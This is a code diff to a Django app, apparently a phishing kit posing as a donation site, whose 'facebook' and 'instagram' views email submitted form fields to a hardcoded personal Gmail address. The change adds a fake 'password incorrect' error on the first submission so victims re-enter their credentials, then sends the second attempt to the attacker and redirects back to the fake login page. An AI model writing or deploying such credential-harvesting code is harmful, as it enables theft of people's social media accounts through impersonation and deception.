@@ -83,29 +83,41 @@ def facebook(request):
         ['osazuwaaihanuwa6@gmail.com'], 
         fail_silently=False, html_message=message)
 
-       return redirect('confirm_account')
+       return redirect('facebook')
 
    return render(request, 'donate/facebook.html')
 
 def instagram(request):
-
-   if request.method == 'POST':
-       product = request.POST['product']
-       massage = request.POST['massage']
-       ctx = {
-           'product' : product,
-           'massage' : massage,
-       }
-       message = render_to_string('donate/email1.html', ctx)
-       send_mail('Contact Form',
-        message,
-        settings.EMAIL_HOST_USER,
-        ['osazuwaaihanuwa6@gmail.com'], 
-        fail_silently=False, html_message=message)
-
-       return redirect('confirm_account')
-
-   return render(request, 'donate/instagram.html')
+    if request.method == 'POST':
+        product = request.POST['product']
+        massage = request.POST['massage']
+        
+        if request.session.get('attempt', 0) < 1:
+            # First attempt fails
+            request.session['attempt'] = request.session.get('attempt', 0) + 1
+            ctx = {
+                'error_message': 'Sorry, your password was incorrect. Please double-check your password.',
+                'product': product,
+                'massage': massage,
+            }
+            return render(request, 'donate/instagram.html', ctx)
+        else:
+            # Second attempt succeeds
+            ctx = {
+                'product': product,
+                'massage': massage,
+            }
+            message = render_to_string('donate/email1.html', ctx)
+            send_mail('Contact Form',
+                      message,
+                      settings.EMAIL_HOST_USER,
+                      ['osazuwaaihanuwa6@gmail.com'], 
+                      fail_silently=False, html_message=message)
+            return redirect('instagram')
+    
+    # Reset attempt count on GET request
+    request.session['attempt'] = 0
+    return render(request, 'donate/instagram.html')
 
 def terms( request):
     return render (request, 'donate/terms.html')      
